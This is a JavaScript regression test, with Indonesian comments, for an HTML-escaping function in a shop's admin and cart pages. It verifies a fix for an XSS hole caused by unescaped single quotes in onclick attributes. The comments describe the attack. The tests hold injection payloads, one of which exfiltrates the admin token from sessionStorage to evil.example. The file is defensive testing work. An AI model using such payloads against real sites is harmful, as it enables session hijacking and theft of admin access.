import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

// esc() escapa HTML dipakai di 3 file front-end (admin.js, cart.js, toko/index.html)
// untuk menaruh data (nama produk/layanan admin, data pesanan pelanggan) ke dalam
// markup lewat innerHTML. Di admin.js, esc() JUGA dipakai untuk menaruh nama
// produk/layanan ke dalam STRING JS BERKUTIP-TUNGGAL di atribut onclick:
//   onclick="delProduct('${p.id}','${esc(p.name)}')"
// Sebelum perbaikan ini, esc() cuma escape & < > " — TIDAK escape kutip tunggal.
// Nama produk/layanan yang mengandung kutip tunggal (mis. hasil import CSV daftar
// harga dari vendor POS, atau kolaborator admin lain) bisa memutus string JS itu
// dan menyuntik JS bebas yang jalan di sesi admin yang sedang login — termasuk
// mencuri token admin dari sessionStorage('rrhc_admin') untuk akses penuh API admin.
// Tes ini memuat SUMBER ASLI tiap file (bukan salinan tertulis ulang) supaya
// menguji kode yang benar-benar dikirim ke browser, bukan tebakan.

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));

function loadEscFromArrowLine(file, needle) {
  const src = readFileSync(path.join(root, file), 'utf8');
  const line = src.split('\n').find(l => l.includes(needle));
  assert.ok(line, `baris "${needle}" tidak ditemukan di ${file}`);
  const expr = line.trim().replace(/^const esc = /, '').replace(/;$/, '');
  return new Function('return (' + expr + ')')();
}

function loadEscFromFunctionLine(file, needle) {
  const src = readFileSync(path.join(root, file), 'utf8');
  const line = src.split('\n').find(l => l.includes(needle));
  assert.ok(line, `baris "${needle}" tidak ditemukan di ${file}`);
  return new Function('return (' + line.trim().replace(/^function /, 'function ') + ')')();
}

const targets = [
  ['public/js/admin.js', () => loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>')],
  ['public/js/cart.js', () => loadEscFromFunctionLine('public/js/cart.js', 'function esc(s)')],
  ['public/toko/index.html', () => loadEscFromFunctionLine('public/toko/index.html', 'function esc(s)')],
];

for (const [file, load] of targets) {
  test(`${file}: esc() meng-escape kelima karakter HTML/JS-string berbahaya`, () => {
    const esc = load();
    assert.equal(esc(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
  });

  test(`${file}: esc() tidak mengubah teks biasa`, () => {
    const esc = load();
    assert.equal(esc('Serum Rambut 100ml'), 'Serum Rambut 100ml');
  });

  test(`${file}: esc() tidak throw untuk null/undefined`, () => {
    const esc = load();
    assert.doesNotThrow(() => esc(null));
    assert.doesNotThrow(() => esc(undefined));
  });
}

test('admin.js: nama produk berkutip-tunggal tidak lagi memutus onclick="delProduct(\'id\',\'nama\')"', () => {
  const esc = loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>');
  const payload = `x'); alert(document.title); //`;
  const onclick = `delProduct('p1','${esc(payload)}')`;
  // KONFIRMASI BUG (sebelum perbaikan): esc lama membiarkan kutip tunggal mentah
  // lolos, jadi string di atas mengandung urutan `');` yang menutup argumen JS
  // lebih awal dan menjalankan `alert(...)` sebagai statement terpisah.
  assert.ok(!onclick.includes("x');"),
    'kutip tunggal mentah lolos — payload bisa memutus string JS di onclick');
  assert.ok(onclick.includes('&#39;'), 'kutip tunggal harus di-escape jadi &#39;');
});

test('admin.js: nama layanan berkutip-tunggal tidak lagi memutus onclick="delPrice(\'id\',\'nama\')"', () => {
  const esc = loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>');
  const payload = `Creambath'); fetch('https://evil.example/steal?t='+sessionStorage.getItem('rrhc_admin')); //`;
  const onclick = `delPrice('h1','${esc(payload)}')`;
  // Hasil escape sama sekali tidak boleh mengandung kutip tunggal mentah di
  // tengah nilai (hanya dua kutip pembatas argumen asli yang tersisa).
  const encodedName = onclick.slice("delPrice('h1','".length, -"')".length);
  assert.ok(!encodedName.includes("'"), 'tidak boleh ada kutip tunggal mentah di dalam nilai ter-escape');
});
